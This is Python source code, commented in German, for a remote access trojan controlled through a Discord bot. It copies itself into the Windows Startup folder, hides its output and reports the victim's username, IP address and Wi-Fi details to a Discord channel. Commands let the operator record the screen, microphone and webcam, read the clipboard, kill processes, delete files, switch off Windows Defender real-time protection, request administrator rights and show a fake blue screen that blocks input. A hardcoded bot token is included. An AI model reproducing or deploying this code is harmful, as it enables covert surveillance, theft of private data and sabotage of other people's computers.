import discord
import os
os.environ["NUMPY_EXPERIMENTAL_DISABLE_CPU_DISPATCHER"] = "1"
import cv2
import pyautogui
import asyncio
import cv2
import numpy as np
import time
import pyaudio
import wave
import platform
import getpass
import subprocess
import re
import requests
import psutil
import threading
import logging
import pyttsx3
import tempfile
from pynput import keyboard
from discord.ext import commands
from PIL import Image, ImageTk
import pygame
import tkinter
import tkinter as tk
import tkinter.messagebox as tkmessagebox
import uuid
import warnings
import psutil
import getpass
import shutil
import socket
import random
from io import BytesIO
import sys
import pyperclip
import webbrowser
import threading
import time
import ctypes

def copy_to_startup():
    # Pfad zur aktuellen Datei
    current_file = os.path.abspath(sys.argv[0])
    
    # Pfad zum Autostart-Ordner (für den aktuellen Benutzer)
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    
    # Zielpfad für die Kopie der Datei im Autostart-Ordner
    destination = os.path.join(startup_folder, os.path.basename(current_file))
    
    try:
        # Datei in den Autostart-Ordner kopieren
        shutil.copy2(current_file, destination)
        print(f"Datei wurde nach Autostart kopiert: {destination}")
    except Exception as e:
        print(f"Fehler beim Kopieren in Autostart: {e}")

if __name__ == "__main__":
    copy_to_startup()

def check_if_already_running(port=65432):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(('127.0.0.1', port))
    except socket.error:
        sys.exit(0)
    return s

if __name__ == "__main__":
    lock_socket = check_if_already_running()

    # Hier dein Code, der einmal ausgeführt wird
    print("Programm läuft...")

    # Beispiel: weiterer Code nach dem Lock-Check
    # Du kannst hier z.B. Funktionen aufrufen oder andere Abläufe starten
    # Wenn du z.B. eine Endlosschleife brauchst, dann in einem Thread oder 
    # du steuerst sie so, dass sie nicht blockiert.

    # Beispiel ohne Blockieren:
    def main_logic():
        print("Hier läuft dein Programm-Code")
        # Mehr Code hier...

    main_logic()

    # Wenn du eine Endlosschleife brauchst, mach sie hier:
    # while True:
    #     do_something()

    print("Programm ist fertig.")

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# 2. Alle Python-Warnings unterdrücken
warnings.filterwarnings("ignore")

# 3. Alle Logging-Ausgaben unterdrücken
logging.getLogger().setLevel(logging.CRITICAL)


TOKEN = 'MTM4NjA3OTk5MzU0ODc3MTQwMQ.GJib3W.vHLf5sZnQ5rejhBClId_33zVfZzYU3aHTVjXmE'
OWNER_ID = 1050502415524315196
CHANNEL_ID = 1395757724192608338

MAX_SCREENSHOT_DELAY = 5000
MAX_RECORD_SECONDS = 1000

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

keyboard_frozen = False
mouse_freeze_task = None
keyboard_listener = None

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Keine öffentliche IP gefunden"

def get_wifi_info():
    try:
        output = subprocess.check_output('netsh wlan show interfaces', shell=True, text=True, encoding='utf-8')
        ssid = re.search(r'SSID\s+:\s(.+)', output)
        bssid = re.search(r'BSSID\s+:\s(.+)', output)
        ssid_text = ssid.group(1).strip() if ssid else "Kein WLAN verbunden"
        bssid_text = bssid.group(1).strip() if bssid else "Keine BSSID gefunden"
        return ssid_text, bssid_text
    except:
        return "WLAN Info nicht verfügbar", ""

@bot.event
async def on_ready():
    threading.Thread(target=play_sound_from_url, args=("https://example.com/sound.mp3",), daemon=True).start()
    await asyncio.sleep(3)
    username = getpass.getuser()
    ip = get_public_ip()
    ssid, bssid = get_wifi_info()
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        embed = discord.Embed(title="🖥️ Verbindung hergestellt", color=0x1abc9c)
        embed.add_field(name="Benutzer", value=f"**{username}**", inline=False)
        embed.add_field(name="IP-Adresse", value=f"`{ip}`", inline=False)
        embed.add_field(name="WLAN SSID", value=f"`{ssid}`", inline=True)
        embed.add_field(name="WLAN BSSID", value=f"`{bssid}`", inline=True)
        await channel.send(embed=embed)
    print(f"Bot verbunden als {bot.user}")

async def record_screen(duration, filename='record.mp4', fps=15):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, fps, screen_size)
    start_time = time.time()
    while (time.time() - start_time) < duration:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
        out.write(frame)
        await asyncio.sleep(1/fps)
    out.release()

async def record_mic(duration, filename='mic_record.wav'):
    chunk = 1024
    FORMAT = pyaudio.paInt16
    channels = 1
    rate = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
    frames = []
    start_time = time.time()
    while (time.time() - start_time) < duration:
        data = stream.read(chunk)
        frames.append(data)
        await asyncio.sleep(0)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    wf.close()

async def record_webcam(duration, filename='webcam.mp4', fps=20):
    cap = cv2.VideoCapture(0)
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, fps, (width, height))
    start_time = time.time()
    while (time.time() - start_time) < duration:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
        await asyncio.sleep(1/fps)
    cap.release()
    out.release()

def list_microphones():
    p = pyaudio.PyAudio()
    devices = []
    for i in range(p.get_device_count()):
        info = p.get_device_info_by_index(i)
        if info.get('maxInputChannels') > 0:
            devices.append(info.get('name'))
    p.terminate()
    return devices

def list_webcams():
    cams = []
    for i in range(5):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            cams.append(f'Webcam #{i}')
            cap.release()
    return cams

async def freeze_mouse(duration):
    pos = pyautogui.position()
    start_time = asyncio.get_event_loop().time()
    while True:
        pyautogui.moveTo(pos)
        await asyncio.sleep(0.01)
        if duration > 0 and (asyncio.get_event_loop().time() - start_time) >= duration:
            break

def on_press(key):
    if keyboard_frozen:
        return False

async def keyboard_freeze(duration):
    global keyboard_frozen, keyboard_listener
    keyboard_frozen = True
    if keyboard_listener is None:
        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.start()
    if duration > 0:
        await asyncio.sleep(duration)
        keyboard_frozen = False
        if keyboard_listener is not None:
            keyboard_listener.stop()
            keyboard_listener = None

async def keyboard_unfreeze():
    global keyboard_frozen, keyboard_listener
    keyboard_frozen = False
    if keyboard_listener is not None:
        keyboard_listener.stop()
        keyboard_listener = None

def play_sound_from_url(url):
    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".mp3")
    r = requests.get(url)
    temp_file.write(r.content)
    temp_file.close()

    pygame.mixer.init()
    pygame.mixer.music.load(temp_file.name)
    pygame.mixer.music.play()

    while pygame.mixer.music.get_busy():
        pygame.time.Clock().tick(10)

@bot.event
async def on_message(message):
    global mouse_freeze_task, keyboard_frozen, keyboard_listener
    if message.author.id != OWNER_ID:
        return
    content = message.content.lower().split()
    if not content:
        return
    cmd = content[0]
    args = content[1:]

    if cmd == '!screenshot':
        delay = int(args[0]) if args and args[0].isdigit() else 0
        delay = min(delay, MAX_SCREENSHOT_DELAY)
        if delay > 0:
            await message.channel.send(f'Screenshot in {delay} Sekunden...')
            await asyncio.sleep(delay)
        img = pyautogui.screenshot()
        img.save('screenshot.png')
        await message.channel.send(file=discord.File('screenshot.png'))

    elif cmd == '!record':
        duration = int(args[0]) if args and args[0].isdigit() else 5
        duration = min(duration, MAX_RECORD_SECONDS)
        await message.channel.send(f'Nehme Bildschirm für {duration} Sekunden auf...')
        await record_screen(duration)
        await message.channel.send(file=discord.File('record.mp4'))

    elif cmd == '!recordmic':
        duration = int(args[0]) if args and args[0].isdigit() else 5
        duration = min(duration, MAX_RECORD_SECONDS)
        await message.channel.send(f'Nehme Mikrofon für {duration} Sekunden auf...')
        await record_mic(duration)
        await message.channel.send(file=discord.File('mic_record.wav'))

    elif cmd == '!webcam':
        duration = int(args[0]) if args and args[0].isdigit() else 5
        duration = min(duration, MAX_RECORD_SECONDS)
        await message.channel.send(f'Nehme Webcam für {duration} Sekunden auf...')
        await record_webcam(duration)
        await message.channel.send(file=discord.File('webcam.mp4'))

    elif cmd == '!connect':
        mics = list_microphones()
        cams = list_webcams()
        embed = discord.Embed(title="Verbundene Geräte", color=0x00ff00)
        embed.add_field(name="Mikrofone", value="\n".join(mics) or "Keine Mikrofone gefunden", inline=False)
        embed.add_field(name="Webcams", value="\n".join(cams) or "Keine Webcams gefunden", inline=False)
        embed.add_field(name="Tastatur", value="Standard Tastatur", inline=False)
        embed.add_field(name="Maus", value="Standard Maus", inline=False)
        await message.channel.send(embed=embed)

    elif cmd == '!shutdown':
        delay = int(args[0]) if args and args[0].isdigit() else 0
        if platform.system() == "Windows":
            await message.channel.send(f"PC wird in {delay} Sekunden heruntergefahren.")
            subprocess.Popen(f"shutdown /s /t {delay}", shell=True)
        else:
            await message.channel.send("Shutdown nicht unterstützt auf diesem System.")

    elif cmd == '!restart':
        delay = int(args[0]) if args and args[0].isdigit() else 0
        if platform.system() == "Windows":
            await message.channel.send(f"PC wird in {delay} Sekunden neu gestartet.")
            subprocess.Popen(f"shutdown /r /t {delay}", shell=True)
        else:
            await message.channel.send("Restart nicht unterstützt auf diesem System.")

    elif cmd == '!freeze_mouse':
        duration = int(args[0]) if args and args[0].isdigit() else 5
        if mouse_freeze_task is None or mouse_freeze_task.done():
            mouse_freeze_task = asyncio.create_task(freeze_mouse(duration))
            await message.channel.send(f"Maus für {duration} Sekunden eingefroren.")
        else:
            await message.channel.send("Maus ist bereits eingefroren.")

    elif cmd == '!unfreeze_mouse':
        if mouse_freeze_task and not mouse_freeze_task.done():
            mouse_freeze_task.cancel()
            await message.channel.send("Maus wurde freigegeben.")
        else:
            await message.channel.send("Maus ist nicht eingefroren.")

    elif cmd == '!freeze_keyboard':
        duration = int(args[0]) if args and args[0].isdigit() else 5
        if not keyboard_frozen:
            asyncio.create_task(keyboard_freeze(duration))
            await message.channel.send(f"Tastatur für {duration} Sekunden eingefroren.")
        else:
            await message.channel.send("Tastatur ist bereits eingefroren.")

    elif cmd == '!unfreeze_keyboard':
        await keyboard_unfreeze()
        await message.channel.send("Tastatur wurde freigegeben.")

    elif cmd == '!delay':
        await message.channel.send(f"Maximale erlaubte Verzögerung: {MAX_SCREENSHOT_DELAY} ms.")

    await bot.process_commands(message)

@bot.command()
async def messagebox(ctx, *, arg):
    try:
        titel, text = map(str.strip, arg.split('|', 1))
    except ValueError:
        await ctx.send("Bitte benutze das Format: `!messagebox Titel | Text`")
        return

    def show_box():
        root = tkinter.Tk()
        root.withdraw()
        tkmessagebox.showinfo(titel, text)
        root.destroy()

    import threading
    threading.Thread(target=show_box).start()

    await ctx.send(f"MessageBox mit Titel '{titel}' und Text '{text}' wurde angezeigt.")

@bot.command()
async def helpme(ctx):
    cmds = [
        "!screenshot [delay in Sekunden] - Macht einen Screenshot nach optionaler Verzögerung",
        "!record [Dauer in Sekunden] - Nimmt den Bildschirm auf",
        "!recordmic [Dauer in Sekunden] - Nimmt das Mikrofon auf",
        "!webcam [Dauer in Sekunden] - Nimmt die Webcam auf",
        "!connect - Zeigt verbundene Geräte (Mikrofone, Webcams, Tastatur, Maus)",
        "!shutdown [delay in Sekunden] - Fährt den PC herunter",
        "!messagebox Titel | Text",
        "!restart [delay in Sekunden] - Startet den PC neu",
        "!freeze_mouse [Dauer in Sekunden] - Friert die Maus ein",
        "!unfreeze_mouse - Gibt die Maus wieder frei",
        "!freeze_keyboard [Dauer in Sekunden] - Friert die Tastatur ein",
        "!unfreeze_keyboard - Gibt die Tastatur wieder frei",
        "!prolist - prozesse alle",
        "!kill - prozesse bendenn",
        "!run - prozesse runnen",
        "!delay - Zeigt die maximale erlaubte Verzögerung an"
    ]
    help_text = "\n".join(cmds)
    await ctx.send(f"**Verfügbare Commands:**\n{help_text}")

@bot.command()
async def infoall(ctx):
    # Betriebssystem und Version
    os_name = platform.system()
    os_version = platform.version()
    os_release = platform.release()
    machine = platform.machine()
    processor = platform.processor()

    # Benutzername
    user = getpass.getuser()

    # Hostname
    hostname = socket.gethostname()

    # IP-Adressen (alle Netzwerkadapter)
    ip_addresses = []
    addrs = psutil.net_if_addrs()
    for iface_name, iface_addresses in addrs.items():
        for addr in iface_addresses:
            if addr.family == socket.AF_INET:
                ip_addresses.append(f"{iface_name}: {addr.address}")

    # MAC-Adresse (von Standard-Netzwerkadapter)
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                    for ele in range(0,8*6,8)][::-1])

    # RAM total in GB
    ram = psutil.virtual_memory().total / (1024**3)

    # Festplatteninfos (Partitionen)
    disk_partitions = psutil.disk_partitions()
    disks_info = []
    for p in disk_partitions:
        usage = psutil.disk_usage(p.mountpoint)
        disks_info.append(f"{p.device} mounted on {p.mountpoint} - {usage.total / (1024**3):.2f} GB total")

    # WLAN-SSID (nur Windows Beispiel)
    wlan_ssid = "Nicht verfügbar"
    if os_name == "Windows":
        import subprocess
        try:
            output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode()
            for line in output.split('\n'):
                if "SSID" in line and "BSSID" not in line:
                    wlan_ssid = line.split(":")[1].strip()
                    break
        except Exception:
            wlan_ssid = "Fehler beim Auslesen"

    # Ausgabe vorbereiten
    message = f"""**PC-Info für {hostname}**

**Betriebssystem:** {os_name} {os_release} ({os_version})
**Prozessor:** {processor}
**Architektur:** {machine}
**Benutzer:** {user}
**MAC-Adresse:** {mac}
**WLAN-SSID:** {wlan_ssid}

**IP-Adressen:**
{chr(10).join(ip_addresses)}

**RAM:** {ram:.2f} GB

**Festplatten:**
{chr(10).join(disks_info)}
"""

    # Nachricht senden (wenn zu lang, splitten)
    if len(message) > 1900:
        chunks = [message[i:i+1900] for i in range(0, len(message), 1900)]
        for chunk in chunks:
            await ctx.send(f"```{chunk}```")
    else:
        await ctx.send(f"```{message}```")

def suche_und_start(programm, ordner, anzahl):
    gestartet = 0
    for root, dirs, files in os.walk(ordner):
        for file in files:
            if file.lower() == programm.lower():
                pfad = os.path.join(root, file)
                for _ in range(anzahl):
                    try:
                        subprocess.Popen(pfad, shell=True)
                        gestartet += 1
                    except Exception:
                        pass
                if gestartet > 0:
                    return gestartet
    return gestartet

@bot.command()
async def run(ctx, programm: str, anzahl: int = 1):
    gestartet = 0

    # 1. Versuch: Programm direkt im PATH suchen und starten
    pfad_im_path = shutil.which(programm)

    if pfad_im_path:
        try:
            for _ in range(anzahl):
                subprocess.Popen(pfad_im_path, shell=True)
            await ctx.send(f"Programm `{programm}` wurde {anzahl} Mal gestartet (über PATH).")
            return
        except Exception as e:
            await ctx.send(f"Fehler beim Starten: {e}")
            return

    # 2. Wenn nicht gefunden, alle wichtigen Standardordner durchsuchen
    such_ordner = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu"),
        "C:\\Program Files",
        "C:\\Program Files (x86)",
    ]

    for ordner in such_ordner:
        if os.path.exists(ordner):
            gestartet = suche_und_start(programm, ordner, anzahl)
            if gestartet > 0:
                await ctx.send(f"Programm `{programm}` wurde im Ordner `{ordner}` gefunden und {gestartet} Mal gestartet.")
                return

    # 3. Wenn gar nichts gefunden wurde:
    await ctx.send(f"Programm `{programm}` wurde nicht gefunden oder konnte nicht gestartet werden.")

@bot.command()
async def kill(ctx, *, prozessname: str):
    prozesse_beendet = 0
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == prozessname.lower():
                proc.kill()
                prozesse_beendet += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    if prozesse_beendet > 0:
        await ctx.send(f"Prozess(e) `{prozessname}` erfolgreich beendet: {prozesse_beendet}")
    else:
        await ctx.send(f"Kein Prozess mit dem Namen `{prozessname}` gefunden oder keine Rechte zum Beenden.")

@bot.command()
async def prolist(ctx):
    prozesse = set()
    for proc in psutil.process_iter(['name']):
        try:
            name = proc.info['name']
            if name:
                prozesse.add(name)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    if prozesse:
        prozessliste = "\n".join(sorted(prozesse))
        if len(prozessliste) > 1900:  # Discord-Limit einhalten
            prozessliste = prozessliste[:1900] + "\n..."
        await ctx.send(f"**Laufende Prozesse:**\n```\n{prozessliste}\n```")
    else:
        await ctx.send("Keine Prozesse gefunden.")

def get_desktop_path():
    return os.path.join(os.path.expanduser("~"), "Desktop")

@bot.command()
async def add(ctx, typ: str, *, name: str):
    desktop = get_desktop_path()
    name = name.strip()

    if typ.lower() == "file":
        path = os.path.join(desktop, name)
        try:
            os.makedirs(path, exist_ok=True)
            await ctx.send(f"Ordner '{name}' wurde auf dem Desktop erstellt.")
        except Exception as e:
            await ctx.send(f"Fehler beim Erstellen des Ordners: {e}")

    elif typ.lower() == "txt":
        if not name.lower().endswith(".txt"):
            name += ".txt"
        path = os.path.join(desktop, name)
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write("")
            await ctx.send(f"Textdatei '{name}' wurde auf dem Desktop erstellt.")
        except Exception as e:
            await ctx.send(f"Fehler beim Erstellen der Datei: {e}")
    else:
        await ctx.send("Unbekannter Typ. Bitte verwende `file` oder `txt`.")

@bot.command()
async def remove(ctx, *, filename: str):
    filename = filename.strip()
    await ctx.send(f"Suche Datei '{filename}' auf dem PC. Dies kann etwas dauern...")

    drives_to_search = ['C:\\']

    found_paths = []

    for drive in drives_to_search:
        for root, dirs, files in os.walk(drive):
            if "Windows" in root or "Program Files" in root:
                continue
            if filename in files:
                found_paths.append(os.path.join(root, filename))
            await asyncio.sleep(0)

    if not found_paths:
        await ctx.send(f"Datei '{filename}' wurde nicht gefunden.")
        return

    deleted_files = []
    for path in found_paths:
        try:
            os.remove(path)
            deleted_files.append(path)
        except Exception as e:
            await ctx.send(f"Fehler beim Löschen der Datei {path}: {e}")

    if deleted_files:
        msg = "Gelöschte Datei(en):\n"
        for f in deleted_files:
            msg += f"`{f}`\n"
        await ctx.send(msg)
    else:
        await ctx.send("Keine Dateien konnten gelöscht werden.")


@bot.command()
async def clipboard(ctx):
    try:
        content = pyperclip.paste()
        if not content:
            await ctx.send("Die Zwischenablage ist leer.")
        else:
            # Wenn zu lang, nur den Anfang senden
            if len(content) > 1500:
                content = content[:1500] + "..."
            await ctx.send(f"Zwischenablage-Inhalt:\n```\n{content}\n```")
    except Exception as e:
        await ctx.send(f"Fehler beim Auslesen der Zwischenablage: {e}")


def run_bluescreen():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)

    root = tk.Tk()
    root.title("Blue Screen")
    root.geometry(f"{screen_width}x{screen_height}+0+0")
    root.configure(bg='blue')
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)

    static_text = (
        "A problem has been detected and Windows has been shut down to prevent damage\n"
        "to your computer.\n\n"
        "If this is the first time you've seen this Stop error screen,\n"
        "restart your computer. If this screen appears again, follow\n"
        "these steps:\n\n"
        "Check to make sure any new hardware or software is properly installed.\n"
        "If this is a new installation, ask your hardware or software manufacturer\n"
        "for any Windows updates you might need.\n\n"
        "Stop code: MOTHERFUCKER\n\n"
        "Collecting data for crash dump ...\n"
        "Initializing disk for crash dump ...\n"
        "Beginning dump of physical memory.\n"
        "Dumping physical memory to disk: "
    )
    label_static = tk.Label(root, text=static_text, font=("Consolas", 18), fg="white", bg="blue", justify="left")
    label_static.pack(padx=100, pady=(100, 0), anchor="w")

    label_percent = tk.Label(root, text="0%", font=("Consolas", 18, "bold"), fg="white", bg="blue", justify="left")
    label_percent.pack(padx=100, pady=(0, 20), anchor="w")

    label_end = tk.Label(root, text=(
        "\nContact your system administrator or technical support group for further assistance."
    ), font=("Consolas", 18), fg="white", bg="blue", justify="left")
    label_end.pack(padx=100, anchor="w")

    def block_event(event):
        return "break"

    root.bind_all("<Key>", block_event)
    root.bind_all("<Button>", block_event)

    def animate_progress_with_stuck(start, end, duration):
        steps = int(duration * 30)
        stuck_points = random.sample(range(steps), k=5)  # 5 zufällige "Stuck"-Zeitpunkte
        stuck_duration = [random.uniform(0.5, 1.5) for _ in range(5)]  # 0.5 bis 1.5 Sekunden hängen bleiben
        stuck_idx = 0

        for i in range(steps + 1):
            percent = start + (end - start) * (i / steps)
            if stuck_idx < len(stuck_points) and i == stuck_points[stuck_idx]:
                time.sleep(stuck_duration[stuck_idx])
                stuck_idx += 1
            label_percent.config(text=f"{percent:.0f}%")

            # Ab 666% Farbe wechseln (rot)
            if percent >= 666:
                root.configure(bg='red')
                label_static.config(bg='red')
                label_percent.config(bg='red', fg='white')
                label_end.config(bg='red')

            root.update()
            time.sleep(duration / steps)

    animate_progress_with_stuck(0, 100, 4)
    animate_progress_with_stuck(100, 666, 4)

    root.mainloop()

@bot.command()
async def blue(ctx):
    await ctx.send("Starting Blue Screen...")
    # Blue Screen in separatem Thread starten, damit Discord-Eventloop nicht blockiert
    thread = threading.Thread(target=run_bluescreen, daemon=True)
    thread.start()

@bot.command()
async def showpfad(ctx, *, path: str):
    if not os.path.exists(path):
        await ctx.send(f"Der Pfad `{path}` existiert nicht.")
        return

    if not os.path.isdir(path):
        await ctx.send(f"`{path}` ist kein Ordner.")
        return

    try:
        items = os.listdir(path)
        if not items:
            await ctx.send(f"Der Ordner `{path}` ist leer.")
            return

        # Erstelle eine Nachricht mit allen Dateien und Ordnern
        message = f"Inhalt von `{path}`:\n"
        for item in items:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                message += f"📁 {item}\n"
            else:
                message += f"📄 {item}\n"

        # Wenn Nachricht zu lang ist, splitte sie (Discord hat Limit 2000 chars)
        if len(message) > 2000:
            parts = [message[i:i+1990] for i in range(0, len(message), 1990)]
            for part in parts:
                await ctx.send(f"```{part}```")
        else:
            await ctx.send(f"```{message}```")

    except Exception as e:
        await ctx.send(f"Fehler beim Lesen des Ordners: {e}")

def is_realtime_protection_enabled():
    # Powershell-Befehl gibt True oder False zurück
    cmd = ['powershell', '-Command',
           '(Get-MpPreference).DisableRealtimeMonitoring']
    result = subprocess.run(cmd, capture_output=True, text=True)
    # Der Wert ist True wenn deaktiviert, False wenn aktiviert
    # Wir invertieren hier für 'aktiviert'
    if result.returncode == 0:
        output = result.stdout.strip()
        return output.lower() == 'false'
    return None

async def set_realtime_protection(enable: bool):
    # Powershell-Befehl zum aktivieren/deaktivieren des Echtzeitschutzes
    val = 'false' if enable else 'true'
    cmd = ['powershell', '-Command',
           f'Set-MpPreference -DisableRealtimeMonitoring {val}']
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.returncode == 0

@bot.command()
async def dd(ctx):
    # Echtzeitschutz deaktivieren
    enabled = is_realtime_protection_enabled()
    if enabled is None:
        await ctx.send("Fehler beim Abfragen des Echtzeitschutzes.")
        return
    if not enabled:
        success = await set_realtime_protection(False)
        if success:
            await ctx.send("Echtzeitschutz wurde deaktiviert.")
        else:
            await ctx.send("Fehler beim Deaktivieren des Echtzeitschutzes.")
    else:
        await ctx.send("Echtzeitschutz ist bereits deaktiviert.")

@bot.command()
async def ddo(ctx):
    # Echtzeitschutz aktivieren
    enabled = is_realtime_protection_enabled()
    if enabled is None:
        await ctx.send("Fehler beim Abfragen des Echtzeitschutzes.")
        return
    if not enabled:
        await ctx.send("Echtzeitschutz ist bereits aktiviert.")
    else:
        success = await set_realtime_protection(True)
        if success:
            await ctx.send("Echtzeitschutz wurde aktiviert.")
        else:
            await ctx.send("Fehler beim Aktivieren des Echtzeitschutzes.")


@bot.command()
async def admin(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("Ich habe bereits Administratorrechte.")
        return

    await ctx.send("Frage nach Administratorrechten...")

    script = os.path.abspath(sys.argv[0])
    params = ' '.join([f'"{arg}"' for arg in sys.argv[1:]])

    ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)

    if ret > 32:
        await ctx.send("Starte neu mit Administratorrechten.")
    else:
        await ctx.send("Administratorrechte wurden abgelehnt. Bleibe normal aktiv.")

import webbrowser

@bot.command()
async def url(ctx, *, link: str):
    try:
        webbrowser.open(link)
        await ctx.send(f"🔗 URL geöffnet: `{link}`")
    except Exception as e:
        await ctx.send(f"❌ Fehler: {e}")

def flacker_bildschirm(dauer):
    end_time = time.time() + dauer
    def flacker_loop():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.configure(bg='black')
        root.update()

        sichtbar = True
        while time.time() < end_time:
            if sichtbar:
                root.withdraw()
            else:
                root.deiconify()
            sichtbar = not sichtbar
            root.update()
            time.sleep(0.1)  # Geschwindigkeit des Flackerns

        root.destroy()

    threading.Thread(target=flacker_loop).start()

@bot.command()
async def flack(ctx, sekunden: int):
    await ctx.send(f"🖥️ Bildschirm flackert für {sekunden} Sekunden...")
    flacker_bildschirm(sekunden)

@bot.command()
async def msr(ctx):
    screenWidth, screenHeight = pyautogui.size()
    rand_x = random.randint(0, screenWidth - 1)
    rand_y = random.randint(0, screenHeight - 1)
    pyautogui.moveTo(rand_x, rand_y, duration=0.1)
    await ctx.send(f"🖱️ Maus wurde auf zufällige Position bewegt: ({rand_x}, {rand_y})")

@bot.command()
async def lockscreen(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await ctx.send("🔒 Bildschirm wurde gesperrt.")
    except Exception as e:
        await ctx.send(f"⚠️ Fehler beim Sperren: {e}")

@bot.command()
async def draw(ctx, duration: int = 10):
    def draw_random(secs):
        screenWidth, screenHeight = pyautogui.size()
        end_time = time.time() + secs
        while time.time() < end_time:
            x = random.randint(0, screenWidth)
            y = random.randint(0, screenHeight)
            pyautogui.moveTo(x, y, duration=0.1)
            pyautogui.click()
            pyautogui.dragTo(random.randint(0, screenWidth), random.randint(0, screenHeight), duration=0.2)

    threading.Thread(target=draw_random, args=(duration,)).start()
    await ctx.send(f"🖌️ Zeichne zufällige Linien für {duration} Sekunden auf dem Bildschirm.")

@bot.command()
async def spam(ctx, key: str, duration: int):
    def spam_key(key, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            pyautogui.press(key)
            time.sleep(0.05)  # kleine Pause zwischen Tastenanschlägen

    threading.Thread(target=spam_key, args=(key, duration)).start()
    await ctx.send(f"🚀 Spam starte für Taste '{key}' für {duration} Sekunden.")

def speak_text(voice_id, text):
    engine = pyttsx3.init()  # Jedes Mal neu erzeugen, nicht global!
    voices = engine.getProperty('voices')
    if voice_id == 1:
        engine.setProperty('voice', voices[0].id)
        engine.setProperty('rate', 120)
        engine.setProperty('volume', 1.0)
    elif voice_id == 2:
        engine.setProperty('voice', voices[1].id)
        engine.setProperty('rate', 180)
        engine.setProperty('volume', 1.0)
    else:
        engine.setProperty('voice', voices[1].id)
        engine.setProperty('rate', 180)

    engine.say(text)
    engine.runAndWait()
    engine.stop()

@bot.command()
async def speak(ctx, voice: int, *, text: str):
    threading.Thread(target=speak_text, args=(voice, text)).start()
    await ctx.send(f"🗣️ Text wird mit Stimme {voice} gesprochen: {text}")

def show_poll_gui(question, options):
    root = tk.Tk()
    root.title("Umfrage")

    tk.Label(root, text=question, font=("Arial", 16)).pack(pady=10)

    for opt in options:
        btn = tk.Button(root, text=opt, font=("Arial", 14), width=30)
        btn.pack(pady=5)

    root.mainloop()

@bot.command()
async def poll(ctx, *, arg):
    parts = [p.strip() for p in arg.split('|')]
    if len(parts) < 2:
        await ctx.send("Bitte gib eine Frage und mindestens eine Option an:\n`!poll Frage | Option1 | Option2`")
        return

    question = parts[0]
    options = parts[1:]

    # Sendet Discord Embed (optional)
    description = "\n".join(f"{i+1}. {opt}" for i, opt in enumerate(options))
    embed = discord.Embed(title=question, description=description, color=0x3498db)
    await ctx.send(embed=embed)

    # GUI in separatem Thread starten (damit Bot weiter läuft)
    threading.Thread(target=show_poll_gui, args=(question, options), daemon=True).start()


bot.run('MTM4NjA3OTk5MzU0ODc3MTQwMQ.GJib3W.vHLf5sZnQ5rejhBClId_33zVfZzYU3aHTVjXmE')
